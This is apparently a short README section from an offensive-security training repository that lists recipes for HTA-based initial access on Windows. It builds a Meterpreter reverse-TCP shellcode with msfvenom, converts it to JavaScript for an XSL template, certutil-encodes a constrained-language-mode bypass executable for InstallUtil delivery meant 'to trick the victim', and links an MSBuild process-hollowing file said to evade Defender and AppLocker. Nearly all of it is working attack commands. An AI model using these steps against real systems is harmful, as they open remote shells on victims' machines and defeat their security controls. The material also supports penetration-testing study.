### <ins>XSL Transform (xsl.hta)</ins>

- Create shellcode using msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o output/shell.txt` 
- Convert to JS using SuperSharpShooter: `python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test` 
- Embed the JS content inside the `template.xsl` template file. 

### <ins>InstallUtil (installutil-template.hta)</ins>
- Compile C# executable that uses Custom Powershell Runspace.
- Convert the outputted EXE to txt using certutil: `certutil -encode clm-bypass.exe file.txt`
- Use the InstallUtil template to trick the victim to download the file.txt file and let the magic happen.

### <ins>MSBuild (msbuild.hta)</ins>
- Use the file [Hollow.xml]([url](https://github.com/Extravenger/OSEP-Combat/blob/main/CLM-Bypass/MSBuild/Hollow.xml)). (Bypass defender and Applocker defautlt rules)
